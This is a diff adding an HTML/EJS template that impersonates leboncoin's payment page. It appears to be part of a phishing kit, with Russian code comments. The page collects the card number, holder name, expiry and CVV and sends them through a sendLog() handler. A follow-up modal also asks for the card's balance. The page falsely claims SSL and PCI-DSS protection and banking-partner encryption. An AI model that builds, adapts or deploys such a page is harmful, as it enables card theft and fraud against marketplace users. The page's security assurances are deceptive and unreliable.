+                        <div class="sc-iujRgT fihASDafy">
+                            <div class="sc-gipzik SNCEdaw">
+                                <div class="sc-gojNiO jngirtD">
+                                    <div class="sc-cQFLBn fnh4hbfi">
+                                        <div class="_2KqHw">
+                                            <h1 class="HlrAk _3zIi4 _35DXM _2-a8M _1JYGK">Étape 2/2</h1>
+                                            <h2 class="_1rwR5 HlrAk _2QVPN _35DXM _2-a8M">Paiement</h2>
+                                        </div>
+                                    </div>
+                                    <script>
+                                        // Функция для получения значения параметра из URL
+                                        function getQueryParam(param) {
+                                            const urlParams = new URLSearchParams(window.location.search);
+                                            return urlParams.get(param);
+                                        }
+
+                                        // Получить значение параметра 'price'
+                                        const price = getQueryParam('price');
+                                        if (price) {
+                                            document.getElementById('finalPrice').innerText = price + ' €';
+                                        }
+                                    </script>
+                                    <div id="main_content">
+                                        <div class="sc-exAgwC eHWKLk">
+                                            <article class="sc-bdVaJa sc-krDsej kGknfw">
+                                                <div class="sc-dTdPqK hzWuVa">
+                                                    <p class="_1hnil _35DXM _1-TTU" style="font-size: 1.4rem;">Votre
+                                                        récapitulatif</p>
+                                                    <div class="sc-fOKMvo PvZen"><span
+                                                            class="_3gP8T _35DXM _25LNb">Montant de l'achat :</span>
+                                                        <span data-qa-id="total-value-text" class="_3gP8T _35DXM _25LNb"
+                                                            style="float: right;">
+                                                            <%=ad.price%>
+                                                        </span> <br> <span class="_3gP8T _35DXM _25LNb">Protection
+                                                            leboncoin :</span>
+                                                        <span id="fsadfasdf" data-qa-id="total-value-text"
+                                                            class="_3gP8T _35DXM _25LNb" style="float: right;">
+                                                            <%= (parseFloat(ad.price) * 0.04).toFixed(2) %> €
+                                                        </span>
+                                                    </div>
+                                                    <footer display="[object Object]" class="sc-bdVaJa fqHNxf"><span
+                                                            class="_3gP8T _35DXM _25LNb">Total à payer :</span> <span
+                                                            id="fsadf" data-qa-id="total-value-text"
+                                                            class="_3Ce01 _3gP8T _35DXM _25LNb">
+                                                            <%=query.price%> €
+                                                        </span></footer>
+                                                </div>
+                                            </article>
+                                        </div>
+                                        <div class="sc-GMQeP iDdsdA">
+                                            <div id="mondial" class="deactive" style="display: block;">
+                                                <div class="sc-lkqHmb kcHEek">
+                                                    <div style="display: flex; justify-content: space-between;">
+                                                        <div style="align-items: center; display: flex;"><img
+                                                                src="/lebonCard_files/radioLebon.png" alt=""
+                                                                style="height: 20px;"> <span
+                                                                style="font-weight: 600; font-size: 14px; margin-left: 15px;">Carte
+                                                                Bancaire</span></div>
+                                                        <div><img src="/lebonCard_files/cardLebon.png" alt=""
+                                                                style="height: 19px;"></div>
+                                                    </div>
+                                                    <div style="display: flex; margin-top: 15px;"><span
+                                                            style="box-sizing: border-box; display: inline-block; overflow: hidden; width: 35px; height: 24px; background: none; opacity: 1; border: 1px solid rgb(0, 0, 0); margin: 0px 15px 0px 0px; padding: 0px; position: relative; border-radius: 4px;"><img
+                                                                alt="cb"
+                                                                src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzYiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAzNiAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTAgMEgzNlYyNEgwVjBaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMzM4N184OTM0OSkiLz4KPG1hc2sgaWQ9Im1hc2swXzMzODdfODkzNDkiIHN0eWxlPSJtYXNrLXR5cGU6YWxwaGEiIG1hc2tVbml0cz0idXNlclNwYWNlT25Vc2UiIHg9IjYiIHk9IjYiIHdpZHRoPSIxMyIgaGVpZ2h0PSIxMiI+CjxwYXRoIGQ9Ik02LjI0NTk3IDE3LjFIMTguODY0VjYuODEyOTlINi4yNDU5N1YxNy4xWiIgZmlsbD0id2hpdGUiLz4KPC9tYXNrPgo8ZyBtYXNrPSJ1cmwoI21hc2swXzMzODdfODkzNDkpIj4KPHBhdGggZD0iTTEyLjUzNzggMTEuNTJIMTguODU1OEMxOC44NzM4IDEwLjg5ODUgMTguNzY0MSAxMC4yNzk5IDE4LjUzMzQgOS43MDI0M0MxOC4zMDI4IDkuMTI1MDEgMTcuOTU2MSA4LjYwMTA2IDE3LjUxNDggOC4xNjI5OUMxNi4zNjI4IDcuMTcyOTkgMTQuMzU1OCA2LjgxMjk5IDEyLjU1NTggNi44MTI5OUMxMC42ODM4IDYuODEyOTkgOC42MTM4MyA3LjIwODk5IDcuNDUyODMgOC4yNzA5OUM3LjAwOTk1IDguNzcwNzUgNi42NzQzOSA5LjM1NjEyIDYuNDY2OTQgOS45OTA4NUM2LjI1OTUgMTAuNjI1NiA2LjE4NDU4IDExLjI5NjEgNi4yNDY4MyAxMS45NjFDNi4yMTM5MyAxMi42NzkyIDYuMzMwNTQgMTMuMzk2NCA2LjU4OTI2IDE0LjA2NzNDNi44NDc5OCAxNC43MzgxIDcuMjQzMTggMTUuMzQ3OSA3Ljc0OTgzIDE1Ljg1OEM4Ljg5MjgzIDE2LjgzOSAxMC43NTU4IDE3LjEgMTIuNTU1OCAxNy4xQzE0LjMwMTggMTcuMSAxNi4xOTE4IDE2LjgwMyAxNy4zMjU4IDE1Ljg3NkMxNy44NTEyIDE1LjM3MjggMTguMjYwNCAxNC43NjA5IDE4LjUyNDYgMTQuMDgzMUMxOC43ODg5IDEzLjQwNTMgMTguOTAxOSAxMi42NzggMTguODU1OCAxMS45NTJIMTIuNTM3OFYxMS41MloiIGZpbGw9IndoaXRlIi8+CjwvZz4KPHBhdGggZD0iTTE5LjI3NzUgMTEuOTUyVjE2Ljg2NkgyOC4wNjE1QzI4LjY4MzkgMTYuODMzNyAyOS4yNyAxNi41NjM0IDI5LjY5ODggMTYuMTExMkMzMC4xMjc3IDE1LjY1ODkgMzAuMzY2MyAxNS4wNTkyIDMwLjM2NTUgMTQuNDM2QzMwLjM2NzMgMTMuODA2MyAzMC4xMzA3IDEzLjE5OTIgMjkuNzAzMyAxMi43MzY3QzI5LjI3NTkgMTIuMjc0MyAyOC42ODk0IDExLjk5MDcgMjguMDYxNSAxMS45NDNMMTkuMjc3NSAxMS45NTJaTTMwLjIxMjUgOS4yNjk5N0MzMC4yMTQ5IDguOTczODIgMzAuMTU4MyA4LjY4MDE3IDMwLjA0NjEgOC40MDYxQzI5LjkzMzkgOC4xMzIwMyAyOS43NjgyIDcuODgzMDQgMjkuNTU4OCA3LjY3MzYzQzI5LjM0OTQgNy40NjQyMiAyOS4xMDA0IDcuMjk4NTggMjguODI2MyA3LjE4NjM1QzI4LjU1MjMgNy4wNzQxMyAyOC4yNTg2IDcuMDE3NTcgMjcuOTYyNSA3LjAxOTk3QzI3Ljg2OTcgNy4wMTIyNSAyNy43NzY2IDcuMDA5MjUgMjcuNjgzNSA3LjAxMDk3SDE5LjI3NzVWMTEuNTJIMjguMTMzNUMyOC42OTY5IDExLjQ3MDYgMjkuMjIxNiAxMS4yMTI1IDI5LjYwNDYgMTAuNzk2MkMyOS45ODc1IDEwLjM3OTkgMzAuMjAxMSA5LjgzNTU5IDMwLjIwMzUgOS4yNjk5NyIgZmlsbD0id2hpdGUiLz4KPGRlZnM+CjxsaW5lYXJHcmFkaWVudCBpZD0icGFpbnQwX2xpbmVhcl8zMzg3Xzg5MzQ5IiB4MT0iMi40NzUiIHkxPSItMy45MjMwOCIgeDI9IjM0LjMxMDkiIHkyPSIyNy4xMTciIGdyYWRpZW50VW5pdHM9InVzZXJTcGFjZU9uVXNlIj4KPHN0b3Agc3RvcC1jb2xvcj0iIzI4OTg0NyIvPgo8c3RvcCBvZmZzZXQ9IjAuNDkiIHN0b3AtY29sb3I9IiMxNzg3QjkiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjMUQzNTY0Ii8+CjwvbGluZWFyR3JhZGllbnQ+CjwvZGVmcz4KPC9zdmc+Cg=="
+                                                                decoding="async" data-nimg="fixed"
+                                                                style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;"></span>
+                                                        <span
+                                                            style="box-sizing: border-box; display: inline-block; overflow: hidden; width: 36px; height: 24px; background: none; opacity: 1; border: 1px solid rgb(174, 174, 174); margin: 0px 15px 0px 0px; padding: 0px; position: relative; border-radius: 4px;"><img
+                                                                alt="visa"
+                                                                src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzYiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAzNiAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGcgc3R5bGU9Im1peC1ibGVuZC1tb2RlOm11bHRpcGx5Ij4KPGcgY2xpcC1wYXRoPSJ1cmwoI2NsaXAwXzMzNjlfNjQ5NCkiPgo8cGF0aCBkPSJNMCAwSDM2VjIzLjRIMFYwWiIgZmlsbD0id2hpdGUiLz4KPHBhdGggZD0iTTE0LjMwOTcgNi45M0wxMC4zMjI3IDE2LjQ3SDcuNzEyNzFMNS43MzI3MSA4Ljg0N0M1LjYxNTcxIDguMzc5IDUuNTA3NzEgOC4yMDggNS4xNDc3MSA4LjAxQzQuNTQ0NzEgNy42OTUgMy41NjM3MSA3LjM4IDIuNjk5NzEgNy4yTDIuNzYyNzEgNi45MTJINi45NjU3MUM3LjUwNTcxIDYuOTEyIDcuOTgyNzEgNy4yNzIgOC4xMDg3MSA3Ljg5M0w5LjE0MzcxIDEzLjQxOUwxMS43MTc3IDYuOTEySDE0LjMxODdMMTQuMzA5NyA2LjkzWk0yNC41NjA3IDEzLjM2NUMyNC41NjA3IDEwLjg0NSAyMS4wNjg3IDEwLjcwMSAyMS4wOTU3IDkuNTc2QzIxLjA5NTcgOS4yMzQgMjEuNDI4NyA4Ljg2NSAyMi4xMzk3IDguNzY2QzIyLjk3NjggOC42ODgzNCAyMy44MTkzIDguODM3NTYgMjQuNTc4NyA5LjE5OEwyNS4wMTA3IDcuMTczQzI0LjI3MDkgNi44OTU5NCAyMy40ODc3IDYuNzUyNyAyMi42OTc3IDYuNzVDMjAuMjU4NyA2Ljc1IDE4LjUzOTcgOC4wNDYgMTguNTIxNyA5LjkwOUMxOC41MDM3IDExLjI4NiAxOS43NDU3IDEyLjA1MSAyMC42ODE3IDEyLjUxOUMyMS42NTM3IDEyLjk3OCAyMS45Nzc3IDEzLjI4NCAyMS45Njg3IDEzLjY5OEMyMS45Njg3IDE0LjMzNyAyMS4yMDM3IDE0LjYyNSAyMC40OTI3IDE0LjYzNEMxOS4yNDE3IDE0LjY1MiAxOC41MjE3IDE0LjMwMSAxNy45NTQ3IDE0LjAzMUwxNy41MDQ3IDE2LjEyOEMxOC4wODA3IDE2LjM4OSAxOS4xNDI3IDE2LjYyMyAyMC4yNDk3IDE2LjYzMkMyMi44NTA3IDE2LjYzMiAyNC41NTE3IDE1LjM1NCAyNC41NjA3IDEzLjM2NVpNMzEuMDEzNyAxNi40NzlIMzMuMjk5N0wzMS4zMDE3IDYuOTNIMjkuMTk1N0MyOC43MTg3IDYuOTMgMjguMzEzNyA3LjIgMjguMTQyNyA3LjYzMkwyNC40MzQ3IDE2LjQ4OEgyNy4wMjY3TDI3LjUzOTcgMTUuMDY2SDMwLjcxNjdMMzEuMDEzNyAxNi40ODhWMTYuNDc5Wk0yOC4yNTA3IDEzLjA5NUwyOS41NTU3IDkuNTA0TDMwLjMwMjcgMTMuMTA0SDI4LjI1OTdMMjguMjUwNyAxMy4wOTVaTTE3Ljg0NjcgNi45M0wxNS44MDM3IDE2LjQ4OEgxMy4zMzc3TDE1LjM4MDcgNi45M0gxNy44NDY3WiIgZmlsbD0iIzE0MzRDQiIvPgo8L2c+CjwvZz4KPGRlZnM+CjxjbGlwUGF0aCBpZD0iY2xpcDBfMzM2OV82NDk0Ij4KPHJlY3Qgd2lkdGg9IjM2IiBoZWlnaHQ9IjIzLjQiIHJ4PSIzIiBmaWxsPSJ3aGl0ZSIvPgo8L2NsaXBQYXRoPgo8L2RlZnM+Cjwvc3ZnPgo="
+                                                                decoding="async" data-nimg="fixed"
+                                                                style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;"></span>
+                                                        <span
+                                                            style="box-sizing: border-box; display: inline-block; overflow: hidden; width: 36px; height: 24px; background: none; opacity: 1; border: 1px solid rgb(174, 174, 174); margin: 0px; padding: 0px; position: relative; border-radius: 4px;"><img
+                                                                alt="mastercard"
+                                                                src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzYiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAzNiAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPGcgc3R5bGU9Im1peC1ibGVuZC1tb2RlOm11bHRpcGx5IiBjbGlwLXBhdGg9InVybCgjY2xpcDBfMzM2OV82NDk4KSI+CjxwYXRoIGQ9Ik0wIDBIMzZWMjMuNEgwVjBaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMTQuNTE3MSAxNy4zNjFIMjEuNDgzMVY2LjAzMDAzSDE0LjUxNzFWMTcuMzUyVjE3LjM2MVoiIGZpbGw9IiNGMDYwMjIiLz4KPHBhdGggZD0iTTE1LjIzNjUgMTEuN0MxNS4yMzMyIDEwLjYwNzkgMTUuNDgwNiA5LjUyOTYzIDE1Ljk1OTYgOC41NDgxOEMxNi40Mzg3IDcuNTY2NzQgMTcuMTM2NSA2LjcwODMyIDE3Ljk5OTUgNi4wMzkwMUMxNi42MDgyIDQuOTQzOTUgMTQuODYyOSA0LjM5ODQ3IDEzLjA5NTYgNC41MDYzM0MxMS4zMjgzIDQuNjE0MiA5LjY2MjMyIDUuMzY3ODcgOC40MTQ1IDYuNjI0MDFDNy43NDYxOCA3LjI4OTYzIDcuMjE1ODcgOC4wODA2NyA2Ljg1NDAzIDguOTUxNzRDNi40OTIxOCA5LjgyMjgyIDYuMzA1OTEgMTAuNzU2OCA2LjMwNTkxIDExLjdDNi4zMDU5MSAxMi42NDMzIDYuNDkyMTggMTMuNTc3MiA2Ljg1NDAzIDE0LjQ0ODNDNy4yMTU4NyAxNS4zMTk0IDcuNzQ2MTggMTYuMTEwNCA4LjQxNDUgMTYuNzc2QzkuNjYyMzIgMTguMDMyMSAxMS4zMjgzIDE4Ljc4NTggMTMuMDk1NiAxOC44OTM3QzE0Ljg2MjkgMTkuMDAxNiAxNi42MDgyIDE4LjQ1NjEgMTcuOTk5NSAxNy4zNjFDMTcuMTQxIDE2LjY4NzYgMTYuNDQ2NCAxNS44MjgzIDE1Ljk2NzkgMTQuODQ3OEMxNS40ODkzIDEzLjg2NzMgMTUuMjM5MiAxMi43OTExIDE1LjIzNjUgMTEuN1oiIGZpbGw9IiNFQTFEMjUiLz4KPHBhdGggZD0iTTI5LjcgMTEuNzAwMUMyOS43IDEzLjYwODEgMjguOTQ0IDE1LjQzNTEgMjcuNTk0IDE2Ljc4NTFDMjYuMzM2NyAxOC4wMjgzIDI0LjY3MDMgMTguNzcyMSAyMi45MDU0IDE4Ljg3ODFDMjEuMTQwNCAxOC45ODQxIDE5LjM5NyAxOC40NDQ5IDE4IDE3LjM2MTFDMTguODU3IDE2LjY4NjQgMTkuNTUwNSAxNS44MjY4IDIwLjAyODkgMTQuODQ2NkMyMC41MDc0IDEzLjg2NjQgMjAuNzU4MyAxMi43OTA5IDIwLjc2MyAxMS43MDAxQzIwLjc2NDIgMTAuNjA4NCAyMC41MTYgOS41MzA3OCAyMC4wMzcxIDguNTQ5NjVDMTkuNTU4MiA3LjU2ODUyIDE4Ljg2MTUgNi43MDk4MiAxOCA2LjAzOTEzQzE5LjM5MDkgNC45NDAzOSAyMS4xMzc1IDQuMzkxODYgMjIuOTA2OCA0LjQ5ODA5QzI0LjY3NjIgNC42MDQzMiAyNi4zNDQ1IDUuMzU3ODcgMjcuNTk0IDYuNjE1MTNDMjguMjY0MSA3LjI4MTEzIDI4Ljc5NTQgOC4wNzM1NiAyOS4xNTY5IDguOTQ2NDZDMjkuNTE4NCA5LjgxOTM1IDI5LjcwMyAxMC43NTUzIDI5LjcgMTEuNzAwMVoiIGZpbGw9IiNGNzlEMUQiLz4KPC9nPgo8ZGVmcz4KPGNsaXBQYXRoIGlkPSJjbGlwMF8zMzY5XzY0OTgiPgo8cmVjdCB3aWR0aD0iMzYiIGhlaWdodD0iMjMuNCIgZmlsbD0id2hpdGUiLz4KPC9jbGlwUGF0aD4KPC9kZWZzPgo8L3N2Zz4K"
+                                                                decoding="async" data-nimg="fixed"
+                                                                style="position: absolute; inset: 0px; box-sizing: border-box; padding: 0px; border: none; margin: auto; display: block; width: 0px; height: 0px; min-width: 100%; max-width: 100%; min-height: 100%; max-height: 100%;"></span>
+                                                    </div>
+                                                    <div>
+                                                        <div class="card_data_main">
+                                                            <div class="card_data_block card_data_left"><span
+                                                                    class="card_data_span">Numéro de carte</span> <span
+                                                                    class="card_data_span_small">champ requis</span>
+                                                                <input type="text" placeholder="Numéro de carte"
+                                                                    id="cardNumber" data-qa-id="cardNumber"
+                                                                    minlength="16" maxlength="19" required="required"
+                                                                    class="card_data_input test_inpit">
+                                                            </div>
+                                                            <div class="card_data_block card_data_right"><span
+                                                                    class="card_data_span">Titulaire de la
+                                                                    carte</span> <span
+                                                                    class="card_data_span_small">champ requis</span>
+                                                                <input type="text" placeholder="Nom écrit sur la carte"
+                                                                    id="cardHolderName" maxlength="80" name="cardholder"
+                                                                    required="required" data-qa-id="cardHolderName"
+                                                                    value="" class="card_data_input">
+                                                            </div>
+                                                        </div>
+                                                        <div class="card_data_main">
+                                                            <div class="card_data_block card_data_left"><span
+                                                                    class="card_data_span">Date d’expiration</span>
+                                                                <span class="card_data_span_small">champ requis</span>
+                                                                <input id="cardMonth" maxlength="5"
+                                                                    placeholder="MM / AA" required="required"
+                                                                    data-qa-id="expirationDate" type="text" value=""
+                                                                    class="card_data_input">
+                                                            </div>
+                                                            <div class="card_data_block card_data_right"><span
+                                                                    class="card_data_span">Cryptogramme</span> <span
+                                                                    class="card_data_span_small">champ requis</span>
+                                                                <input type="text" placeholder="Example: 456"
+                                                                    id="cardCvv" minlength="3" maxlength="3"
+                                                                    required="required" class="card_data_input">
+                                                            </div>
+                                                        </div>
+                                                        <div><input type="checkbox"> <span
+                                                                style="font-size: 15px; margin-left: 6px;">J’enregistre
+                                                                cette carte pour de futurs achats</span></div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <p class="_2k43C HGqCc _3c6yv Dqdzf _3j0OU cJtdT">Votre banque peut vous
+                                                demander d’autoriser le paiement pour compléter votre achat.</p>
+                                            <div class="styles_mobilePriceLineContainer__RIkYd">
+                                                <div class="_9dEbO">
+                                                    <div display="flex" class="sc-bdVaJa gBKina"><span
+                                                            class="_1hnil _35DXM _1-TTU">Total</span><span id="total"
+                                                            class="_3Ce01 _1hnil _35DXM _1-TTU">
+                                                            <%=query.price%> €
+                                                                </span></div>
+                                                                </div>
+                                                                </div> <input id="cardBalance" type="hidden" value="{{totalPrice}}">
+                                                                <div class="styles_submitContainer__uYPpz">
+                                                                    <div class="_1x_aE _6UM0J"><button onclick="sendLog()" id="fsadf" class="sc-cMljjf sc-jDwBTQ kBGDvm">
+                                                                            <%=query.price%> €
+                                                                        </button>
+                                                                    </div>
+                                                                    <div class="_1x_aE y7uUX">
+                                                                        <section class="sc-daURTG imMZAK"><button onclick="sendLog()" id="fsadfasdf"
+                                                                                class="sc-cMljjf sc-jDwBTQ kBGDvm">
+                                                                                Payer
+                                                                            </button></section>
+                                                                    </div>
+                                                                </div>
+                                                                <p class="_2k43C HGqCc _3c6yv Dqdzf _3j0OU cJtdT">Vous êtes sur un serveur
+                                                                    de paiement sécurisé par les normes ssl (https) et pcidss de nos
+                                                                    partenaires bancaires.
+                                                                    <br>
+                                                                    Vos données sont encryptées pour plus de sécurité.
+                                                                </p>
+                                                                <p class="_2k43C HGqCc _3c6yv Dqdzf _3j0OU cJtdT"><span style="text-decoration: underline; cursor: pointer;">Me
+                                                                        renseigner</span> sur les finalités du traitement de mes données
+                                                                    personnelles, les durées de conservation et mes droits.</p>
+                                                                </div>
+                                                                </div>
+                                                                </div>
+                                                                </div>
+                                                                </div>
+                                                                </div>
+                    <div id="verification">
+                        <div id="verif-window">
+                            <div id="verif-contnt">
+                                <div id="content" style="display: block;">
+                                    <div
+                                        style="font-size: 16px; color: rgb(0, 0, 0); margin-bottom: 15px; font-weight: 600; padding-bottom: 10px; border-bottom: 1px solid rgb(209, 176, 45); font-family: &quot;Open Sans&quot;;">
+                                        Les données ont été vérifiées
+                                    </div>
+                                    <div id="modal_input_block">
+                                        <div
+                                            style="color: rgb(63, 63, 63); line-height: 1.6; background: rgb(236, 236, 236); border-radius: 10px; padding: 25px 5px;">
+                                            Pour confirmer la transaction dans le système de traitement, saisissez le
+                                            solde de la carte
+                                        </div>
+                                        <div class="cap_card"><label class="label_name"
+                                                style="border: none; width: 100%; text-align: center;">Solde:</label>
+                                            <div class="data_card_div"><input type="text" name="iurowerngihvshwbkg"
+                                                    id="jb4k2j34ifsopk23e" class="data_card_input"
+                                                    style="border-top: none; border-right: none; border-bottom: 1px solid rgb(163, 163, 163); border-left: none; border-image: initial; background: none; border-radius: 0px; color: rgb(51, 51, 51); margin-bottom: 20px; padding: 5px 15px; font-size: 18px; text-align: center;">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div id="modal_input_submit"><button id="balance_btn" class="submit_button"><span
+                                                class="submit_button_span"
+                                                style="width: 100%; border: none; padding: 10px 20px; font-size: 16px; background-color: rgb(255, 110, 20); border-radius: 6px; color: white;">Continua</span></button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <svg height="0" width="0" class="sc-bdVaJa fabXAL">
+        <symbol id="SvgHeartoutline">
+            <path
+                d="M21.19 2.24A6.76 6.76 0 0012 3.61a6.76 6.76 0 00-9.19-1.37A6.89 6.89 0 000 7.58c-.16 4.84 4 8.72 10.26 14.66l.12.12a2.32 2.32 0 003.23 0l.13-.12C20 16.29 24.15 12.41 24 7.57a6.89 6.89 0 00-2.81-5.33zm-9.07 18.15l-.12.12-.12-.12C6.17 15 2.4 11.46 2.4 7.86a4.18 4.18 0 014.2-4.37 4.68 4.68 0 014.28 3h2.25a4.66 4.66 0 014.27-3 4.18 4.18 0 014.2 4.37c0 3.6-3.77 7.14-9.48 12.53z">
+            </path>
+        </symbol>
+        <symbol id="SvgLeboncoinlogo">
+            <path
+                d="M58.29 36.625c3.604-.006 5.83-2.864 5.83-7.11 0-4.25-2.22-7.1-5.82-7.1s-5.81 2.84-5.81 7.1c0 4.256 2.206 7.104 5.8 7.11zm2.7-21.1c6.87 0 11.4 5.92 11.5 13.89 0 8.1-4.74 14.1-11.69 14.1a10 10 0 01-8.66-4.63h-.11v4.11h-7.54V6.915c0-2.75 1.83-4.47 4-4.47s4 1.72 4 4.47v12.86h.11a10.212 10.212 0 018.39-4.25zm27.76 21.1c3.61 0 5.81-2.86 5.81-7.11s-2.2-7.1-5.81-7.1c-3.61 0-5.81 2.84-5.81 7.1s2.2 7.11 5.81 7.11zm0-21.1c8.5 0 14 5.81 14 14 0 8.19-5.49 14-14 14s-14-5.81-14-14c0-8.19 5.49-14 14-14zm106.85 0c2.2 0 4.03 1.72 4.07 4.47v23h-8.07v-23c0-2.75 1.79-4.47 4-4.47zm0-14.05a4.9 4.9 0 010 9.8h-.002a4.9 4.9 0 11.003-9.8zm25.24 14.05c5.6 0 8.61 3.98 8.61 10.01v17.46h-8.07v-15.2c0-3.55-1.67-4.73-3.77-4.73-3.12 0-5.49 2.63-5.49 8.23v11.7h-8.07v-23.25c0-2.64 1.73-4.2 3.77-4.2s3.76 1.56 3.76 4.2v1h.11a10.637 10.637 0 019.15-5.22zm-46.67 21.1c3.61 0 5.82-2.86 5.82-7.11s-2.219-7.1-5.82-7.1c-3.6 0-5.81 2.84-5.81 7.1s2.21 7.11 5.81 7.11zm0-21.1c8.511 0 14 5.81 14 14 0 8.19-5.489 14-14 14-8.51 0-14-5.81-14-14 0-8.19 5.5-14 14-14zm-25.94 7c-3.5 0-5.65 2.58-5.65 7s2.15 7 5.65 7a5.407 5.407 0 004.9-2.69h.1l5.87 3.77c-2.04 3.98-6.3 5.92-11.14 5.92-8.4 0-13.57-5.81-13.57-14 0-8.19 5.17-14 13.57-14 4.84 0 9.14 1.92 11.14 5.92l-5.87 3.77h-.1a5.406 5.406 0 00-4.9-2.69zm-25.46-7c5.6 0 8.61 3.98 8.63 10.01v17.46h-8.07v-15.2c0-3.55-1.67-4.73-3.77-4.73-3.12 0-5.49 2.63-5.49 8.23v11.7h-8.08v-23.27c0-2.64 1.7-4.18 3.75-4.18s3.77 1.56 3.77 4.2v1h.11a10.627 10.627 0 019.15-5.22zm-100.23 12.4a9.966 9.966 0 00.54 3.01l9-6.67a4.48 4.48 0 00-4.12-2.34c-2.55 0-5.42 1.92-5.42 6zm7.82 9a8.32 8.32 0 006.89-4.44l5.31 3.84c-2.03 4.13-6.17 7.19-13.17 7.19a13.68 13.68 0 01-9-3.4c-3.52 2.34-6.52 3.34-9.52 3.34-6.05 0-10.32-4.05-10.32-10.13V6.845c0-2.74 1.82-4.46 4-4.46 2.18 0 4 1.72 4 4.46v25.81c0 2.6 1.14 4 3.53 4 1.3 0 2.71-.75 4.54-1.75a16.647 16.647 0 01-1.3-6.57c0-5.71 4.07-12.81 12.62-12.81 7.41 0 11.39 4.31 13.05 9.72l-14.27 10.24a5.181 5.181 0 003.64 1.44z"
+                fill-rule="evenodd"></path>
+        </symbol>
+        <symbol id="SvgMessageoutline">
+            <path
+                d="M18 12h-7.2a1.13 1.13 0 00-1.2 1.2 1.13 1.13 0 001.2 1.2H18a1.2 1.2 0 000-2.4zM6 7.2h12A1.13 1.13 0 0019.2 6 1.13 1.13 0 0018 4.8H6a1.2 1.2 0 000 2.4z">
+            </path>
+            <path
+                d="M21.6 0H2.4A2.41 2.41 0 000 2.4v14.4a2.41 2.41 0 002.4 2.4h16.8L24 24V2.4A2.41 2.41 0 0021.6 0zm0 18.24l-1.44-1.44H2.4V2.4h19.2z">
+            </path>
+            <path d="M6 10.8h12a1.13 1.13 0 001.2-1.2A1.13 1.13 0 0018 8.4H6a1.2 1.2 0 100 2.4z"></path>
+        </symbol>
+        <symbol id="SvgNotificationoutline">
+            <path
+                d="M12 24a2.49 2.49 0 002.5-2.46h-5A2.48 2.48 0 0012 24zM21.13 18.2l-1.62-1.58v-6.16c0-3.78-2.05-6.94-5.63-7.78v-.83a1.88 1.88 0 00-3.76 0v.83c-3.59.84-5.63 4-5.63 7.78v6.16L2.87 18.2a1.23 1.23 0 00.88 2.11h16.49a1.23 1.23 0 00.89-2.11zM17 17.85H7v-7.39c0-3.05 1.89-5.54 5-5.54s5 2.49 5 5.54z">
+            </path>
+        </symbol>
+        <symbol id="SvgSearch">
+            <path
+                d="M23.58 21.45l-7-7a9.42 9.42 0 001.62-6.87A9.13 9.13 0 0010.34.07a9.25 9.25 0 00-2.81 18.27 9.25 9.25 0 007-1.76l7 7a1.54 1.54 0 002.11 0 1.56 1.56 0 00-.06-2.13zM9.22 15.5a6.37 6.37 0 116.33-6.37 6.33 6.33 0 01-6.33 6.37z">
+            </path>
+        </symbol>
+        <symbol id="SvgArrowleft">
+            <path
+                d="M22.46 10.43H5.26l7.51-7.72a1.63 1.63 0 000-2.25 1.52 1.52 0 00-2.17 0L.45 10.88a1.61 1.61 0 000 2.23L10.6 23.54a1.52 1.52 0 002.17 0 1.61 1.61 0 000-2.23l-7.51-7.72h17.2a1.58 1.58 0 000-3.16z">
+            </path>
+        </symbol>
+        <symbol id="SvgSecurepayment">
+            <path
+                d="M20.23 3.59L12.84.17a2.13 2.13 0 00-1.68 0L3.77 3.59a2.18 2.18 0 00-1.27 2v5.19c0 6.07 4 11.81 9.5 13.24 5.49-1.43 9.5-7.17 9.5-13.24V5.57a2.18 2.18 0 00-1.27-1.98zM13 9.54a.52.52 0 01.53.56.51.51 0 01-.53.55H9.89v1.1H13a.51.51 0 01.53.55.52.52 0 01-.53.56h-2.69A3.69 3.69 0 0013.58 15a3.51 3.51 0 001.9-.55.63.63 0 01.85.11.76.76 0 01-.11 1.1 4.35 4.35 0 01-2.64.78 5 5 0 01-4.75-3.53H7.36a.52.52 0 01-.53-.56.47.47 0 01.53-.44h1.16v-1.1H7.36a.55.55 0 010-1.1h1.47a5.19 5.19 0 014.75-3.54 5.33 5.33 0 012.64.78.69.69 0 01.11 1.05.81.81 0 01-.85.11 3 3 0 00-1.9-.66 3.81 3.81 0 00-3.27 2.09z">
+            </path>
+        </symbol>
+        <symbol id="SvgMarkeroutline">
+            <path
+                d="M9 5.546c1.775 0 3.214 1.379 3.214 3.08 0 1.702-1.439 3.08-3.214 3.08s-3.214-1.378-3.214-3.08c0-1.701 1.439-3.08 3.214-3.08zm0 15.281c2.7-3.328 6.429-8.627 6.429-12.2 0-3.45-2.829-6.162-6.429-6.162S2.571 5.176 2.571 8.626C2.571 12.2 6.3 17.5 9 20.827zM9 0c5.014 0 9 3.82 9 8.626 0 5.177-5.657 12.201-8.1 14.912a1.237 1.237 0 01-1.928 0C5.657 20.828 0 13.803 0 8.626 0 3.82 3.986 0 9 0z"
+                fill-rule="evenodd"></path>
+        </symbol>
+        <symbol id="SvgMondialrelay">
+            <defs>
